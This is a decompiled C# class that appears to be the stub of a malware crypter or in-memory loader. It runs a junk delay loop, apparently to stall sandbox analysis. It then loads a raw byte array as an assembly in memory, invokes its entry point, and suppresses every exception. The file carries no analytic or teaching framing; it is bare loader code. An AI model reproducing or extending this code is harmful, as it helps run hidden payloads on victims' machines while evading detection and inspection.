using System;
using Microsoft.VisualBasic.CompilerServices;

[StandardModule]
internal sealed class Class2
{
	public static object smethod_0(byte[] byte_0)
	{
		long num = 0L;
		long num2 = default(long);
		do
		{
			num2 = Conversions.ToLong(Conversions.ToString(num2) + Conversions.ToString(0.5));
			num++;
		}
		while (num <= 1000000L);
		object result = default(object);
		try
		{
			Class1.object_6 = new object[-Class1.int_0[1] + 1];
			Class1.assembly_0 = AppDomain.CurrentDomain.Load(byte_0);
			Class1.assembly_0.EntryPoint!.Invoke(null, Class1.object_6);
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}
}
